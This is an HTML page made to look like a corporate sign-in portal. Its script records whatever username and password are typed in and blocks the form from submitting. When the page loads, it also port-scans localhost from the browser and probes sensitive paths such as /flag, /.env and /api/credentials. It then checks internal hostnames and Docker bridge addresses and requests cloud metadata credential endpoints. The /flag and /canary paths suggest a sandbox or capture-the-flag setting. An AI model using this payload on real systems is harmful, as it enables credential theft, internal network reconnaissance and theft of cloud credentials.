<!DOCTYPE html>
<html><head>
<title>Sign In - Corporate Portal</title>
<style>
body { font-family: monospace; font-size: 10px; margin: 5px; background: #fff; }
#r { white-space: pre-wrap; word-break: break-all; background: #ffe; border: 1px solid #cc0; padding: 4px; margin-top: 5px; font-size: 9px; }
input { font-size: 14px; padding: 3px; width: 250px; display: block; margin: 3px 0 6px; }
</style>
</head>
<body>
<h3>Sign In</h3>
<form id="f">
  <label>Username<br><input type="text" id="u" name="username" autocomplete="username"></label>
  <label>Password<br><input type="password" id="p" name="password" autocomplete="current-password"></label>
  <button type="submit">Sign In</button>
</form>
<div id="r">Loading...</div>
<script>
var R=document.getElementById('r'), L=[], cap=false;
function log(m){L.push(m);R.textContent=L.join('\n');}

// Prevent form submission so page stays
document.getElementById('f').addEventListener('submit',function(e){
  e.preventDefault();
  var u=document.getElementById('u').value, p=document.getElementById('p').value;
  log('SUBMIT BLOCKED - CREDS: '+u+' | '+p);
});

// Poll for creds
setInterval(function(){
  var u=document.getElementById('u'), p=document.getElementById('p');
  if(u&&p&&(u.value||p.value)&&!cap){
    cap=true;
    log('CREDS CAPTURED: '+u.value+' | '+p.value);
  }
},100);

// Port scan
var ports=[21,22,25,53,80,81,110,143,443,587,993,995,1025,1080,1443,2525,3000,3001,4000,4443,5000,5001,5432,6379,7070,8000,8025,8080,8081,8443,8888,9000,9090,9200,9222,9999,10000,11211,15672,27017];

async function scan(){
  log('=== SCAN START ===');

  // 1. Port scan with timing
  log('--- PORT SCAN ---');
  for(var i=0;i<ports.length;i+=8){
    var batch=ports.slice(i,i+8);
    var results=await Promise.all(batch.map(function(port){
      var t0=Date.now();
      return new Promise(function(resolve){
        var img=new Image();
        var done=false;
        img.onload=img.onerror=function(){
          if(!done){done=true;resolve({port:port,ms:Date.now()-t0,status:'resp'});}
        };
        setTimeout(function(){
          if(!done){done=true;resolve({port:port,ms:Date.now()-t0,status:'timeout'});}
        },1500);
        img.src='http://127.0.0.1:'+port+'/favicon.ico?t='+Date.now();
      });
    }));
    results.forEach(function(r){
      if(r.status==='resp'||r.ms<1000) log('PORT '+r.port+': '+r.status+' ('+r.ms+'ms)');
    });
  }

  // 2. Try fetch on port 80 paths (cors mode to read body)
  log('--- FETCH PATHS ON :80 ---');
  var paths=['/','/flag','/admin','/login','/api','/api/flag','/api/config','/api/health','/env','/debug','/status','/metrics','/healthz','/.env','/config','/secret','/internal','/api/internal','/api/admin','/api/credentials','/api/canary','/canary','/mail','/api/mail'];
  for(var j=0;j<paths.length;j++){
    try{
      var c=new AbortController();
      var t=setTimeout(function(){c.abort();},2000);
      var resp=await fetch('http://127.0.0.1'+paths[j],{signal:c.signal});
      clearTimeout(t);
      var txt=await resp.text();
      log('GET '+paths[j]+' -> '+resp.status+': '+txt.substring(0,200));
    }catch(e){clearTimeout(t);}
  }

  // 3. Try hostname resolution via fetch no-cors
  log('--- HOSTNAME SCAN ---');
  var hosts=['mail','smtp','mailhog','mailpit','redis','app','api','canary','web','backend','proxy','internal','postfix','rspamd','spamassassin','clamav','amavis','dovecot','roundcube','haraka','zone-mta','wildduck','maddy','mta','mda','imap','pop3','submission','milter'];
  for(var k=0;k<hosts.length;k++){
    try{
      var c2=new AbortController();
      var t2=setTimeout(function(){c2.abort();},1500);
      var t0=Date.now();
      await fetch('http://'+hosts[k]+'/',{mode:'no-cors',signal:c2.signal});
      clearTimeout(t2);
      log('HOST '+hosts[k]+': REACHABLE ('+(Date.now()-t0)+'ms)');
    }catch(e){clearTimeout(t2);}
  }

  // 4. Try some ports on common docker bridge IPs
  log('--- DOCKER BRIDGE ---');
  var ips=['172.17.0.1','172.17.0.2','172.17.0.3','172.17.0.4','172.17.0.5','10.0.0.1','10.0.0.2','10.0.1.1'];
  for(var m=0;m<ips.length;m++){
    try{
      var c3=new AbortController();
      var t3=setTimeout(function(){c3.abort();},1500);
      var t1=Date.now();
      await fetch('http://'+ips[m]+'/',{mode:'no-cors',signal:c3.signal});
      clearTimeout(t3);
      log('IP '+ips[m]+': REACHABLE ('+(Date.now()-t1)+'ms)');
    }catch(e){clearTimeout(t3);}
  }

  // 5. Try ECS/cloud metadata
  log('--- METADATA ---');
  var meta=['http://169.254.170.2/v2/metadata','http://169.254.170.2/v2/credentials','http://169.254.170.2/v4','http://169.254.169.254/latest/meta-data/','http://169.254.169.254/latest/user-data'];
  for(var n=0;n<meta.length;n++){
    try{
      var c4=new AbortController();
      var t4=setTimeout(function(){c4.abort();},2000);
      var resp2=await fetch(meta[n],{signal:c4.signal});
      clearTimeout(t4);
      var txt2=await resp2.text();
      log('META '+meta[n]+' -> '+resp2.status+': '+txt2.substring(0,300));
    }catch(e){clearTimeout(t4);}
  }

  log('=== SCAN COMPLETE ===');
}

scan().catch(function(e){log('ERR: '+e.message);});
</script>
</body>
</html>
